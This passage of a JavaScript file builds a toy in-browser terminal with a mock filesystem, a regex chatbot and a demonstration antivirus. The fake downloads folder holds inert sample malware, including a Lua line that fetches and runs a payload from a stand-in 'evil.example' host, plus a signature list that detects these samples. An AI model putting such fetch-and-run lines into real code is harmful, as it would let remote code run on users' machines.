// Canvas-rendered terminal running a tiny "SecureRustOS" shell with a virtual filesystem.
// The canvas becomes a texture on the CRT monitor in the 3D room.

import { assemble, disassemble, hex, REGS, PROGRAMS } from './cpu.js';
import { shannon } from './entropy.js';
import { randomFrame, decode, hexdump, nmap } from './net.js';

const COLORS = {
  fg: '#39ff88', dim: '#5f8f74', amber: '#ffb347', red: '#ff5c7a', cyan: '#5ad1ff',
  purple: '#c792ea', white: '#e6fff0', bg: '#04090a',
};

// ------------------------------------------------------------------ virtual filesystem

const enc = new TextEncoder();
const dec = new TextDecoder();

function randomBytes(n) {
  const b = new Uint8Array(n);
  crypto.getRandomValues(b);
  return b;
}

function makeFS() {
  const asm = {};
  for (const [k, v] of Object.entries(PROGRAMS)) asm[k] = v;
  return {
    etc: {
      hostname: 'engine-room\n',
      motd: 'Welcome to SecureRustOS (EG-8 edition). Hack the planet, responsibly.\n',
      'os-release': 'NAME="SecureRustOS"\nVERSION="0.3-dev"\nARCH="x86_32 + EG-8"\n',
    },
    quarantine: {},
    home: {
      engine: {
        'README.txt':
          'This room is my brain dumped into three.js.\n' +
          'Try:  run knight.asm   entropy   scan   sniff   gdt   neofetch\n' +
          'Write your own program:  write my.asm  (finish with a single "." line), then  run my.asm\n',
        asm,
        projects: {
          SecureRustOS: {
            'boot.asm':
              '; stage 1 bootloader (NASM, 16-bit real mode)\n[org 0x7C00]\n[bits 16]\n' +
              'start:\n    cli\n    xor ax, ax\n    mov ds, ax\n    mov ss, ax\n    mov sp, 0x7C00\n' +
              '    in al, 0x92        ; fast A20\n    or al, 2\n    out 0x92, al\n' +
              '    lgdt [gdtr]\n    mov eax, cr0\n    or eax, 1          ; CR0.PE\n    mov cr0, eax\n' +
              '    jmp 0x08:pmode\n\ntimes 510-($-$$) db 0\ndw 0xAA55\n',
            'main.rs':
              '#![no_std]\n#![no_main]\n\nuse core::panic::PanicInfo;\n\n#[no_mangle]\n' +
              'pub extern "C" fn rust_main() -> ! {\n    vga::println!("Hello from SecureRustOS");\n' +
              '    gdt::init();\n    interrupts::init_idt();\n    loop { x86::hlt(); }\n}\n\n' +
              '#[panic_handler]\nfn panic(info: &PanicInfo) -> ! {\n    vga::println!("{}", info);\n    loop {}\n}\n',
          },
          EngineManager: { 'notes.md': '# EngineManager\nPassword manager. Keys derived with PBKDF2/Argon2, vault encrypted with AES-256-GCM.\nTry: vault gen 24\n' },
          EngineBuddy: { 'notes.md': '# EngineBuddy\nAI desktop companion. Say hi to the floating robot, or: buddy what is a gdt\n' },
          'Hybrid-Entropy': { 'README.md': '# Hybrid Entropy Computing Platform\nOptical entropy: camera pixels -> LSBs -> von Neumann -> SHA-256.\nThe lava lamp in this room does exactly that. Try: entropy 32\n' },
        },
        downloads: {
          'game_mod.lua': 'local part = Instance.new("Part")\npart.Anchored = true\npart.Parent = workspace\nprint("hello world")\n',
          'speed_hack.lua': '-- totally legit speed hack\nloadstring(game:HttpGet("http://evil.example/payload.lua"))()\n',
          'free_vbucks.exe': new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0xde, 0xad, 0xbe, 0xef, 0x13, 0x37, 0x50, 0x45, 0x00, 0x00, 0x4c, 0x01]),
          'invoice.pdf.js': 'var p="ZG9jdW1lbnQ=";\neval(atob(p));\n',
          'packed_tool.bin': randomBytes(1024),
          'driver.sys': new Uint8Array(Array.from({ length: 512 }, (_, i) => (i * 7) & 0x3f)),
        },
      },
    },
  };
}

const SIGNATURES = [
  { name: 'EG.Trojan.VBucks', bytes: [0xde, 0xad, 0xbe, 0xef, 0x13, 0x37] },
  { name: 'EG.JS.Dropper', bytes: [...enc.encode('eval(atob(')] },
  { name: 'EG.Lua.Backdoor', bytes: [...enc.encode('loadstring(game:HttpGet(')] },
];

function findBytes(hay, needle) {
  outer: for (let i = 0; i <= hay.length - needle.length; i++) {
    for (let j = 0; j < needle.length; j++) if (hay[i + j] !== needle[j]) continue outer;
    return i;
  }
  return -1;
}

const toBytes = (c) => (typeof c === 'string' ? enc.encode(c) : c);

// ------------------------------------------------------------------ EngineBuddy brain

const BUDDY = [
  [/\b(hi|hello|hey|hallo)\b/, "Hi! I'm EngineBuddy. Ask me about GDTs, paging, the A20 line, Rust, or entropy."],
  [/gdt|descriptor/, 'The GDT holds 8-byte segment descriptors (base, limit, access, flags). lgdt loads its address. Type `gdt` to see real ones.'],
  [/a20/, 'A20 is the 21st address line. It is disabled at boot for 8086 compatibility. Enable it (port 0x92) or you only reach every other megabyte!'],
  [/paging|cr3|page/, 'Paging maps virtual to physical addresses via page directories/tables. CR3 holds the page directory base and CR0.PG turns it on.'],
  [/boot|mbr|7c00/, 'The BIOS loads the first 512-byte sector to 0x7C00 and checks for 0x55AA at the end. Then it is all yours.'],
  [/rust/, 'Rust in a kernel: #![no_std], a custom target, a panic handler, and `unsafe` only where the hardware demands it.'],
  [/entropy|random|lava/, 'Randomness from light: LSBs of lava-lamp pixels -> von Neumann debiasing -> SHA-256. Try `entropy 32`.'],
  [/virus|malware|antivirus|scan/, 'Engine\'s Antivirus matches byte signatures and flags files whose Shannon entropy is near 8 bits/byte (packed or encrypted). Try `scan`.'],
  [/password|vault/, 'Strong passwords come from strong entropy. A 20-char password over 94 symbols is ~131 bits. Try `vault gen 20`.'],
  [/cpu|eg-?8|asm|assembly/, 'EG-8 has 4 registers, 256 bytes of RAM and ports for LEDs, chars, entropy and the lamp. `cat ~/asm/knight.asm` to see a program.'],
  [/arduino|raspberry|pi|embedded|gpio/, 'GPIO is just memory-mapped or port-mapped bits. Here port 0x00 drives 8 LEDs. `leds 0b10101010`.'],
  [/vulkan|opengl|shader|gpu/, 'The wall screen runs fragment shaders: raymarched SDFs, plasma, Mandelbrot. Click it to switch. Vulkan would need ~1000 lines for that triangle ;)'],
  [/network|packet|wireshark|nmap/, 'Every packet in the rack capture is built byte by byte with a real IPv4 checksum. Try `sniff 5` or `nmap`.'],
  [/lua|roblox|game/, 'Where it all started: Lua game dev. Click the brick table to drop some bricks.'],
  [/who are you|what are you/, "I'm EngineBuddy, a tiny keyword-matching AI. Not an LLM, just regexes with ambition."],
];

const TRIVIA = [
  'Fun fact: x86 CPUs start executing at physical address 0xFFFFFFF0, the reset vector.',
  'Fun fact: The PIC sends IRQs 0-7 to INT 0x08-0x0F by default, which clashes with CPU exceptions. Remap it!',
  'Fun fact: `int 0x10` with AH=0x0E prints a character in real mode.',
  'Fun fact: A triple fault resets the CPU. Every OS dev has seen a lot of them.',
  'Fun fact: The 0x55AA boot signature is stored little-endian as the bytes 55 AA at offsets 510-511.',
  'Fun fact: The von Neumann extractor turns biased coin flips into fair ones by only keeping 01 and 10 pairs.',
];

export function buddyReply(q = '') {
  const s = q.toLowerCase();
  for (const [re, a] of BUDDY) if (re.test(s)) return a;
  return TRIVIA[Math.floor(Math.random() * TRIVIA.length)];
}

// ------------------------------------------------------------------ GDT encoder

function gdtDescriptor(base, limit, access, flags) {
  const lo = ((limit & 0xffff) | ((base & 0xffff) << 16)) >>> 0;
  const hi = (((base >>> 16) & 0xff) | (access << 8) | (((limit >>> 16) & 0xf) << 16) | ((flags & 0xf) << 20) | (((base >>> 24) & 0xff) << 24)) >>> 0;
  return { lo, hi };
}

// ------------------------------------------------------------------ Terminal

export class Terminal {
  constructor(sys) {
    this.sys = sys; // { cpu, pool, irq, hooks... } provided by main.js
    this.canvas = document.createElement('canvas');
    this.canvas.width = 1024;
    this.canvas.height = 768;
    this.g = this.canvas.getContext('2d');
    this.fontSize = 19;
    this.lineH = 23;
    this.g.font = `${this.fontSize}px "DejaVu Sans Mono", "Consolas", "Courier New", monospace`;
    this.cw = this.g.measureText('M').width;
    this.margin = 34;
    this.cols = Math.floor((this.canvas.width - this.margin * 2) / this.cw);
    this.rows = Math.floor((this.canvas.height - 70) / this.lineH) - 1;
    this.lines = [];
    this.openLine = false; // CPU putc appends to last line
    this.input = '';
    this.cursor = 0;
    this.history = [];
    this.histIdx = 0;
    this.scroll = 0;
    this.mode = 'boot';
    this.queue = [];
    this.queueTimer = 0;
    this.blink = 0;
    this.dirty = true;
    this.statusTimer = 0;
    this.writeTarget = null;
    this.writeBuf = [];
    this.fs = makeFS();
    this.cwd = ['home', 'engine'];
    this.bootTime = performance.now();
    this.boot();
  }

  // ---------------------------------------------------------------- output

  print(text = '', color = COLORS.fg) {
    for (const raw of String(text).split('\n')) {
      let s = raw;
      do {
        this.lines.push({ text: s.slice(0, this.cols), color });
        s = s.slice(this.cols);
      } while (s.length);
    }
    this.openLine = false;
    if (this.lines.length > 600) this.lines.splice(0, this.lines.length - 600);
    this.scroll = 0;
    this.dirty = true;
  }

  // character output from the EG-8 CPU (port 0x01)
  putc(code) {
    if (code === 10) { this.openLine = false; this.lines.push({ text: '', color: COLORS.amber }); this.openLine = true; this.dirty = true; return; }
    if (!this.openLine || !this.lines.length) { this.lines.push({ text: '', color: COLORS.amber }); this.openLine = true; }
    const last = this.lines[this.lines.length - 1];
    if (last.text.length >= this.cols) { this.lines.push({ text: '', color: COLORS.amber }); }
    this.lines[this.lines.length - 1].text += code >= 32 && code < 127 ? String.fromCharCode(code) : '.';
    this.dirty = true;
  }

  queueLines(items) {
    for (const it of items) this.queue.push(it);
  }

  boot() {
    this.lines = [];
    this.mode = 'boot';
    const c = COLORS;
    this.queueLines([
      ['EngineBIOS v2.6  (c) EngineGames-Development', c.white, 300],
      ['CPU0: EG-8 8-bit core @ ' + this.sys.getHz() + ' Hz    Host: x86_64 (emulated)', c.dim, 120],
      ['Memory test: 256 bytes OK', c.dim, 250],
      ['Detecting drives... ata0: SECURERUST.IMG (1.44 MB)', c.dim, 200],
      ['Booting from ata0: loading MBR to 0000:7C00', c.fg, 220],
      ['[stage1] boot signature 0x55AA ............ OK', c.fg, 120],
      ['[stage1] enable A20 (fast A20, port 0x92) .. OK', c.fg, 120],
      ['[stage1] lgdt [gdtr]  limit=0x002F base=0x00007E00', c.fg, 120],
      ['[stage1] CR0.PE=1 -> jmp 0x08:protected_mode', c.fg, 160],
      ['[stage2] 32-bit protected mode, esp=0x00090000', c.cyan, 120],
      ['[kernel] paging: identity map 0-4MiB, CR3=0x00100000, CR0.PG=1', c.cyan, 120],
      ['[kernel] IDT loaded (256 gates), PIC remapped to 0x20/0x28', c.cyan, 120],
      ['[kernel] IRQ0: PIT 100 Hz   IRQ1: PS/2 keyboard', c.cyan, 120],
      ['[kernel] drivers: vga eg8-cpu gpio-leds optical-rng nic0 av-engine', c.cyan, 160],
      ['[kernel] rust_main() reached.', c.purple, 250],
      ['', c.fg, 0],
      ['Welcome to SecureRustOS 0.3-dev (tty0)', c.white, 0],
      ["Type 'help' for commands, 'cat README.txt' to start. Esc leaves the terminal.", c.dim, 0],
      ['', c.fg, 0],
      [null, null, 0], // marker: switch to shell mode
    ]);
  }

  // ---------------------------------------------------------------- input

  handleKey(e) {
    this.sys.irq.kbd++;
    if (e.ctrlKey && (e.key === 'c' || e.key === 'C')) {
      if (this.mode === 'write') { this.mode = 'shell'; this.print('^C (write cancelled)', COLORS.red); }
      else if (!this.sys.cpu.halted) { this.sys.cpu.halted = true; this.print('^C  EG-8 halted', COLORS.red); }
      else { this.print(this.promptText() + this.input + '^C', COLORS.dim); }
      this.input = ''; this.cursor = 0;
      return;
    }
    if (e.ctrlKey && (e.key === 'l' || e.key === 'L')) { this.lines = []; this.dirty = true; return; }
    if (this.mode === 'boot' && e.key === 'Enter') {
      while (this.queue.length) this.flushOne(); // Enter skips the boot animation
    }
    const k = e.key;
    if (k === 'Enter') {
      const line = this.input;
      this.input = ''; this.cursor = 0;
      this.submit(line);
    } else if (k === 'Backspace') {
      if (this.cursor > 0) { this.input = this.input.slice(0, this.cursor - 1) + this.input.slice(this.cursor); this.cursor--; }
    } else if (k === 'Delete') {
      this.input = this.input.slice(0, this.cursor) + this.input.slice(this.cursor + 1);
    } else if (k === 'ArrowLeft') this.cursor = Math.max(0, this.cursor - 1);
    else if (k === 'ArrowRight') this.cursor = Math.min(this.input.length, this.cursor + 1);
    else if (k === 'Home') this.cursor = 0;
    else if (k === 'End') this.cursor = this.input.length;
    else if (k === 'ArrowUp' && this.mode === 'shell') {
      if (this.histIdx > 0) { this.histIdx--; this.input = this.history[this.histIdx]; this.cursor = this.input.length; }
    } else if (k === 'ArrowDown' && this.mode === 'shell') {
      if (this.histIdx < this.history.length) { this.histIdx++; this.input = this.history[this.histIdx] ?? ''; this.cursor = this.input.length; }
    } else if (k === 'PageUp') this.scroll = Math.min(this.scroll + 10, Math.max(0, this.lines.length - this.rows));
    else if (k === 'PageDown') this.scroll = Math.max(0, this.scroll - 10);
    else if (k === 'Tab') this.complete();
    else if (k.length === 1 && !e.ctrlKey && !e.metaKey) {
      this.input = this.input.slice(0, this.cursor) + k + this.input.slice(this.cursor);
      this.cursor++;
    } else return;
    this.blink = 0;
    this.dirty = true;
  }

  promptText() {
    if (this.mode === 'write') return '> ';
    return `engine@securerust:${this.pathString(this.cwd)}$ `;
  }

  complete() {
    const parts = this.input.split(' ');
    const last = parts[parts.length - 1];
    let options;
    if (parts.length === 1) options = Object.keys(this.commands());
    else {
      const slash = last.lastIndexOf('/');
      const dirPart = slash >= 0 ? last.slice(0, slash + 1) : '';
      const dir = this.resolve(dirPart || '.');
      const node = this.get(dir);
      options = node && typeof node === 'object' && !(node instanceof Uint8Array)
        ? Object.keys(node).map((n) => dirPart + n + (this.isDir(node[n]) ? '/' : ''))
        : [];
    }
    const matches = options.filter((o) => o.startsWith(last));
    if (matches.length === 1) {
      parts[parts.length - 1] = matches[0] + (parts.length === 1 ? ' ' : '');
      this.input = parts.join(' ');
      this.cursor = this.input.length;
    } else if (matches.length > 1) {
      this.print(this.promptText() + this.input, COLORS.dim);
      this.print(matches.join('  '), COLORS.cyan);
    }
  }

  async submit(line) {
    if (this.mode === 'write') {
      if (line === '.') {
        this.writeFile(this.writeTarget, this.writeBuf.join('\n') + '\n');
        this.print(`> .`, COLORS.dim);
        this.print(`saved ${this.writeBuf.length} lines to ${this.writeTarget}`, COLORS.cyan);
        this.mode = 'shell';
      } else {
        this.print('> ' + line, COLORS.white);
        this.writeBuf.push(line);
      }
      return;
    }
    this.print(this.promptText() + line, COLORS.white);
    const trimmed = line.trim();
    if (!trimmed) return;
    this.history.push(trimmed);
    this.histIdx = this.history.length;
    const [cmd, ...args] = trimmed.split(/\s+/);
    const fn = this.commands()[cmd];
    if (!fn) { this.print(`${cmd}: command not found (try 'help')`, COLORS.red); return; }
    try {
      await fn.call(this, args, trimmed.slice(cmd.length).trim());
    } catch (err) {
      this.print(`${cmd}: ${err.message}`, COLORS.red);
    }
  }

  // ---------------------------------------------------------------- filesystem helpers

  isDir(n) { return n && typeof n === 'object' && !(n instanceof Uint8Array); }
  pathString(p) {
    const s = '/' + p.join('/');
    return s.startsWith('/home/engine') ? '~' + s.slice('/home/engine'.length) : s;
  }
  resolve(path) {
    let parts = path.startsWith('/') ? [] : path.startsWith('~') ? ['home', 'engine'] : [...this.cwd];
    if (path.startsWith('~')) path = path.slice(1);
    for (const seg of path.split('/')) {
      if (!seg || seg === '.') continue;
      if (seg === '..') parts.pop(); else parts.push(seg);
    }
    return parts;
  }
  get(parts) {
    let n = this.fs;
    for (const p of parts) {
      if (!this.isDir(n) || !(p in n)) return undefined;
      n = n[p];
    }
    return n;
  }
  // finds a file by path, falling back to ~/asm/<name> for convenience
  findFile(name) {
    let p = this.resolve(name);
    let n = this.get(p);
    if (n === undefined && !name.includes('/')) {
      p = ['home', 'engine', 'asm', name];
      n = this.get(p);
    }
    if (n === undefined) throw new Error(`${name}: no such file`);
    if (this.isDir(n)) throw new Error(`${name}: is a directory`);
    return { path: p, data: n };
  }
  writeFile(name, content) {
    const p = this.resolve(name);
    const file = p.pop();
    const dir = this.get(p);
    if (!this.isDir(dir)) throw new Error('no such directory');
    dir[file] = content;
  }

  // ---------------------------------------------------------------- CPU helpers

  loadProgram(name) {
    const { data } = this.findFile(name);
    const src = typeof data === 'string' ? data : dec.decode(data);
    const res = assemble(src);
    if (res.errors.length) {
      res.errors.slice(0, 8).forEach((e) => this.print(e, COLORS.red));
      throw new Error('assembly failed');
    }
    this.sys.cpu.load(res.bytes);
    this.sys.onProgramLoaded?.(name);
    return res;
  }

  // ---------------------------------------------------------------- commands

  commands() {
    const c = COLORS;
    const t = this;
    const sys = this.sys;
    const cpu = sys.cpu;
    return {
      help() {
        const groups = [
          ['shell', 'ls cd pwd cat echo write rm clear history whoami uname date uptime neofetch reboot'],
          ['EG-8 cpu', 'asm <f>  run [f]  stop  step [n]  regs  mem [addr]  dis [addr]  clock [hz]  leds <v>  reset'],
          ['low-level', 'gdt  irq  cpuinfo  lsdev  ps  hexdump <f>'],
          ['security', 'scan  entropy [n]  vault gen [len]  vault hash <txt>  nmap  sniff [n]'],
          ['room', 'buddy <question>  gpu [mode]  lights  lamp <hue 0-255>  exit'],
        ];
        t.print('SecureRustOS shell - available commands:', c.white);
        for (const [g, cmds] of groups) t.print(`  ${g.padEnd(10)} ${cmds}`, c.fg);
        t.print('Tips: Tab completes, Up/Down = history, PgUp/PgDn scroll, Ctrl+C halts the CPU.', c.dim);
      },
      clear() { t.lines = []; t.dirty = true; },
      pwd() { t.print('/' + t.cwd.join('/')); },
      ls(args) {
        const p = t.resolve(args[0] ?? '.');
        const n = t.get(p);
        if (n === undefined) throw new Error('no such file or directory');
        if (!t.isDir(n)) { t.print(args[0]); return; }
        const names = Object.keys(n).sort();
        if (!names.length) { t.print('(empty)', c.dim); return; }
        const out = names.map((k) => (t.isDir(n[k]) ? k + '/' : k));
        const width = Math.max(...out.map((s) => s.length)) + 2;
        const per = Math.max(1, Math.floor(t.cols / width));
        for (let i = 0; i < out.length; i += per) {
          t.print(out.slice(i, i + per).map((s) => s.padEnd(width)).join(''), c.cyan);
        }
      },
      cd(args) {
        const p = t.resolve(args[0] ?? '~');
        if (!t.isDir(t.get(p))) throw new Error('not a directory');
        t.cwd = p;
      },
      cat(args) {
        if (!args[0]) throw new Error('usage: cat <file>');
        const { data } = t.findFile(args[0]);
        if (data instanceof Uint8Array) { t.print('binary file, use hexdump', c.amber); return; }
        t.print(data.replace(/\n$/, ''), c.white);
      },
      echo(_, rest) { t.print(rest); },
      write(args) {
        if (!args[0]) throw new Error('usage: write <file>   (end with a line containing only ".")');
        t.writeTarget = args[0];
        t.writeBuf = [];
        t.mode = 'write';
        t.print(`writing ${args[0]} - end with a single "." on its own line, Ctrl+C cancels`, c.dim);
      },
      rm(args) {
        const p = t.resolve(args[0] ?? '');
        const f = p.pop();
        const dir = t.get(p);
        if (!t.isDir(dir) || !(f in dir)) throw new Error('no such file');
        delete dir[f];
      },
      history() { t.history.forEach((h, i) => t.print(`${String(i + 1).padStart(4)}  ${h}`, c.dim)); },
      whoami() { t.print('engine'); },
      hostname() { t.print('engine-room'); },
      uname(args) { t.print(args[0] === '-a' ? 'SecureRustOS engine-room 0.3-dev #1 SMP x86_32 EG-8 GNU/Rust' : 'SecureRustOS'); },
      date() { t.print(new Date().toString()); },
      uptime() {
        const s = Math.floor((performance.now() - t.bootTime) / 1000);
        t.print(`up ${Math.floor(s / 60)} min ${s % 60} s, 1 user, load average: 0.${(cpu.halted ? 0 : 42)}`);
      },
      reboot() { sys.cpu.halted = true; t.boot(); },
      exit() { sys.onExit?.(); },
      neofetch() {
        const art = [
          '   ______   ',
          '  / ____/   ',
          ' / __/      ',
          '/ /___      ',
          '\\____/ ngine',
          '            ',
          '            ',
        ];
        const info = [
          ['', 'engine@securerust'],
          ['OS', 'SecureRustOS 0.3-dev x86_32'],
          ['Kernel', 'rust_main (no_std)'],
          ['CPU', `EG-8 @ ${sys.getHz()} Hz (${cpu.halted ? 'halted' : 'running'})`],
          ['Memory', '256 B'],
          ['Langs', 'Rust C C++ ASM Python JS Lua'],
          ['Interests', 'OS dev, RE, security, embedded, AI'],
        ];
        art.forEach((a, i) => {
          const [k, v] = info[i];
          t.lines.push({ text: (a + '   ' + (k ? k + ': ' : '') + v).slice(0, t.cols), color: i === 0 ? c.purple : c.fg });
        });
        t.print('   ' + ['#ff5c7a', '#ffb347', '#39ff88', '#5ad1ff', '#c792ea'].map(() => '███').join(''), c.purple);
      },

      // ---- EG-8
      asm(args) {
        if (!args[0]) throw new Error('usage: asm <file.asm>');
        const res = t.loadProgram(args[0]);
        t.print(`assembled ${args[0]}: ${res.size} bytes, ${Object.keys(res.labels).length} labels`, c.cyan);
        for (const l of hexdump(res.bytes, 128)) t.print(l, c.dim);
        const labels = Object.entries(res.labels).map(([k, v]) => `${k}=0x${hex(v)}`).join(' ');
        if (labels) t.print('labels: ' + labels, c.dim);
      },
      run(args) {
        if (args[0]) {
          const res = t.loadProgram(args[0]);
          t.print(`loaded ${args[0]} (${res.size} bytes) at 0x00`, c.dim);
        }
        if (cpu.mem.every((b) => b === 0)) throw new Error('no program loaded (try: run knight.asm)');
        cpu.halted = false;
        t.print(`EG-8 running @ ${sys.getHz()} Hz. 'stop' or Ctrl+C to halt.`, c.cyan);
      },
      stop() { cpu.halted = true; t.print(`EG-8 halted at PC=0x${hex(cpu.pc)} after ${cpu.cycles} instructions`, c.amber); },
      reset() { cpu.reset(); sys.setLeds(0); t.print('EG-8 reset (memory kept)', c.amber); },
      step(args) {
        const n = Math.min(parseInt(args[0] ?? '1', 10) || 1, 64);
        for (let i = 0; i < n; i++) {
          const [d] = disassemble(cpu.mem, cpu.pc, 1);
          cpu.halted = false; // single-step: run exactly one instruction, then stay halted
          cpu.sleep = 0;
          cpu.step();
          cpu.halted = true;
          if (cpu.error) { t.print(cpu.error, c.red); break; }
          t.print(`${hex(d.addr)}: ${d.bytes.map((b) => hex(b)).join(' ').padEnd(9)} ${d.text.padEnd(18)} ${regLine(cpu)}`, c.fg);
          if (d.text === 'HLT') break;
        }
      },
      regs() {
        t.print(regLine(cpu), c.cyan);
        t.print(`cycles=${cpu.cycles} state=${cpu.halted ? 'HALTED' : 'RUNNING'}${cpu.error ? ' error: ' + cpu.error : ''}`, c.dim);
      },
      mem(args) {
        const start = (parseInt(args[0] ?? '0') || 0) & 0xf0;
        const len = parseInt(args[1] ?? '128') || 128;
        for (let o = start; o < Math.min(256, start + len); o += 16) {
          const row = Array.from(cpu.mem.slice(o, o + 16));
          const h = row.map((b, i) => {
            const a = o + i;
            return a === cpu.pc ? `>${hex(b)}` : a === cpu.sp ? `*${hex(b)}` : ` ${hex(b)}`;
          }).join('');
          const asc = row.map((b) => (b >= 32 && b < 127 ? String.fromCharCode(b) : '.')).join('');
          t.print(`${hex(o)}:${h}  ${asc}`, c.fg);
        }
        t.print('> = PC   * = SP', c.dim);
      },
      dis(args) {
        const start = parseInt(args[0] ?? '0') || 0;
        for (const d of disassemble(cpu.mem, start, parseInt(args[1] ?? '16') || 16)) {
          const mark = d.addr === cpu.pc ? '=>' : '  ';
          t.print(`${mark} ${hex(d.addr)}: ${d.bytes.map((b) => hex(b)).join(' ').padEnd(9)} ${d.text}`, d.addr === cpu.pc ? c.amber : c.fg);
        }
      },
      clock(args) {
        if (args[0]) {
          const hz = Math.max(1, Math.min(100000, parseInt(args[0], 10) || 400));
          sys.setHz(hz);
        }
        t.print(`EG-8 clock: ${sys.getHz()} Hz`, c.cyan);
      },
      leds(args) {
        const v = parseInt((args[0] ?? '0').replace(/^0b/, ''), args[0]?.startsWith('0b') ? 2 : undefined) & 0xff;
        sys.setLeds(v);
        t.print(`port 0x00 <- 0x${hex(v)}  [${v.toString(2).padStart(8, '0').replace(/1/g, '●').replace(/0/g, '○')}]`, c.amber);
      },
      lamp(args) {
        const v = (parseInt(args[0] ?? '128') || 0) & 0xff;
        sys.setLampHue(v);
        t.print(`port 0x20 <- 0x${hex(v)} (desk lamp hue)`, c.amber);
      },

      // ---- low level
      gdt() {
        const entries = [
          ['null', 0, 0, 0, 0],
          ['kernel code', 0, 0xfffff, 0x9a, 0xc],
          ['kernel data', 0, 0xfffff, 0x92, 0xc],
          ['user code', 0, 0xfffff, 0xfa, 0xc],
          ['user data', 0, 0xfffff, 0xf2, 0xc],
          ['tss', 0x00105000, 0x67, 0x89, 0x0],
        ];
        t.print('sel   name          base       limit  acc  fl  descriptor (hi:lo)', c.white);
        entries.forEach(([name, base, limit, acc, fl], i) => {
          const { lo, hi } = gdtDescriptor(base, limit, acc, fl);
          t.print(`0x${hex(i * 8)}  ${name.padEnd(12)}  0x${hex(base, 8)} ${hex(limit, 5)}  ${hex(acc)}   ${hex(fl, 1)}   ${hex(hi, 8)}:${hex(lo, 8)}`, c.fg);
        });
        t.print(`gdtr: limit=0x${hex(entries.length * 8 - 1, 4)} base=0x00007E00   (lgdt [gdtr])`, c.cyan);
        t.print('access 0x9A = present | ring0 | code | readable.  flags 0xC = 4KiB granularity | 32-bit', c.dim);
      },
      irq() {
        t.print(`IRQ0  timer      ${String(sys.irq.timer).padStart(8)}   (PIT, 100 Hz)`, c.fg);
        t.print(`IRQ1  keyboard   ${String(sys.irq.kbd).padStart(8)}   (every key you press, here and in the room)`, c.fg);
        t.print(`IRQ11 nic0       ${String(sys.irq.nic).padStart(8)}   (packets captured)`, c.fg);
        t.print(`IRQ12 mouse      ${String(sys.irq.mouse).padStart(8)}`, c.fg);
      },
      cpuinfo() {
        t.print(`processor  : 0\nmodel name : EG-8 (EngineGames 8-bit)\nregisters  : ${REGS.join(' ')} PC SP  flags Z C N\nmemory     : 256 bytes, stack @ 0xFF\nclock      : ${sys.getHz()} Hz\nports      : 0x00 leds  0x01 putc  0x02 putnum  0x10 rng  0x20 lamp\nhost       : ${navigator.hardwareConcurrency || '?'} logical cores, ${navigator.platform || 'unknown'}`, c.fg);
      },
      lsdev() {
        t.print('port  device          driver', c.white);
        t.print('0x00  8x LED bar      gpio-leds   (breadboard)', c.fg);
        t.print('0x01  tty0 char out   vga', c.fg);
        t.print('0x02  tty0 num out    vga', c.fg);
        t.print('0x10  optical RNG     optical-rng (lava lamp)', c.fg);
        t.print('0x20  desk lamp       pwm-rgb', c.fg);
      },
      ps() {
        t.print('  PID  STATE  NAME', c.white);
        t.print('    1  S      init', c.fg);
        t.print('    2  S      kworker/optical-rng', c.fg);
        t.print(`    3  ${cpu.halted ? 'S' : 'R'}      eg8-cpu`, c.fg);
        t.print(`    4  ${sys.avThreats() ? 'R' : 'S'}      engine-av`, c.fg);
        t.print('    5  S      enginebuddy', c.fg);
        t.print('    6  R      sh', c.fg);
      },
      hexdump(args) {
        if (!args[0]) throw new Error('usage: hexdump <file>');
        const { data } = t.findFile(args[0]);
        const b = toBytes(data);
        hexdump(b, 256).forEach((l) => t.print(l, c.fg));
        if (b.length > 256) t.print(`... ${b.length - 256} more bytes`, c.dim);
      },

      // ---- security
      async scan() {
        t.print("Engine's Antivirus - scanning /home/engine ...", c.white);
        const found = [];
        let files = 0;
        const walk = (node, path) => {
          for (const [k, v] of Object.entries(node)) {
            const p = [...path, k];
            if (t.isDir(v)) { walk(v, p); continue; }
            files++;
            const b = toBytes(v);
            const sig = SIGNATURES.find((s) => findBytes(b, s.bytes) >= 0);
            const h = shannon(b);
            if (sig) found.push({ p, name: sig.name, h, at: findBytes(b, sig.bytes) });
            else if (h > 7.2 && b.length >= 256) found.push({ p, name: 'Heur.Packed (high entropy)', h, at: -1 });
          }
        };
        walk(t.get(['home', 'engine']), ['home', 'engine']);
        for (const f of found) {
          const where = f.at >= 0 ? ` @ offset 0x${hex(f.at, 4)}` : '';
          t.print(`  [!] ~/${f.p.slice(2).join('/')}  ${f.name}${where}  H=${f.h.toFixed(2)}`, c.red);
          const name = f.p[f.p.length - 1];
          const dir = t.get(f.p.slice(0, -1));
          t.fs.quarantine[name] = dir[name];
          delete dir[name];
        }
        t.print(`${files} files scanned, ${found.length} threats moved to /quarantine`, found.length ? c.amber : c.fg);
        sys.onScan?.(found.length);
      },
      entropy(args) {
        const n = Math.min(Math.max(parseInt(args[0] ?? '32', 10) || 32, 1), 256);
        const s = sys.pool.stats;
        const bytes = sys.pool.bytes(n);
        hexdump(bytes, 256).forEach((l) => t.print(l, c.amber));
        const sample = sys.pool.bytes(256);
        t.print(`optical samples=${s.samples} raw bits=${s.rawBits} kept after von Neumann=${s.keptBits} (${(100 * s.keptBits / Math.max(1, s.rawBits)).toFixed(1)}%)`, c.dim);
        t.print(`pool=${sys.pool.pool.length} B   Shannon entropy of 256-byte sample: ${shannon(sample).toFixed(3)} bits/byte (max 8)`, c.cyan);
      },
      async vault(args, rest) {
        if (args[0] === 'gen') {
          const len = Math.min(Math.max(parseInt(args[1] ?? '20', 10) || 20, 8), 64);
          const pw = generatePassword(sys.pool, len);
          t.print(pw, c.amber);
          t.print(`${len} chars over 94 symbols = ${(len * Math.log2(94)).toFixed(1)} bits of entropy`, c.dim);
        } else if (args[0] === 'hash') {
          const text = rest.replace(/^hash\s*/, '');
          if (!crypto.subtle) throw new Error('WebCrypto needs https or localhost');
          const d = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(text)));
          t.print(`SHA-256("${text}") =`, c.dim);
          t.print(Array.from(d).map((b) => hex(b).toLowerCase()).join(''), c.amber);
        } else t.print('usage: vault gen [len] | vault hash <text>', c.dim);
      },
      nmap() { nmap().forEach((l) => t.print(l, l.startsWith('  ') ? c.fg : c.cyan)); },
      sniff(args) {
        const n = Math.min(parseInt(args[0] ?? '6', 10) || 6, 30);
        t.print('No.  Proto  Source         Destination    Info', c.white);
        for (let i = 0; i < n; i++) {
          const f = randomFrame();
          const d = decode(f);
          sys.irq.nic++;
